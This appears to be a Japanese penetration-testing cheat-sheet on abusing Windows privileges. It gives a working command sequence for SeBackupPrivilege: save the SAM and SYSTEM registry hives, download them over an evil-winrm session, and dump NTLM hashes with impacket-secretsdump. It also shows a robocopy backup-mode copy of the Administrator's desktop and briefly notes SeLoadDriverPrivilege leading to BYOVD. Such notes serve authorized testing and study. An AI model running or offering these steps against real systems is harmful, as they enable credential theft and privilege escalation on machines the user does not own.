# SeBackupPrivilege
通常Backup Operatorsグループのメンバーやシステムアカウントに付与される特権。Windowsの通常ACLを無視してアクセスできる。  
## レジストリからNTLM奪取
```bash
# レジストリからNTLMハッシュの奪取
reg save hklm\sam sam # SAMレジストリを保存
reg save hklm\system system # SYSTEMレジストリを保存
download sam # evil-winrmを使用したダウンロード
download system # evil-winrmを使用したダウンロード
impacket-secretsdump -sam sam -system system local

# robocopyを使用した管理者フォルダのコピー
robocopy /b C:\Users\Administrator\Desktop\ C:\
```
# SeLoadDriverPrivilege
新しいデバイスドライバーをカーネルメモリにロードする特権。BYOVDにつながる。
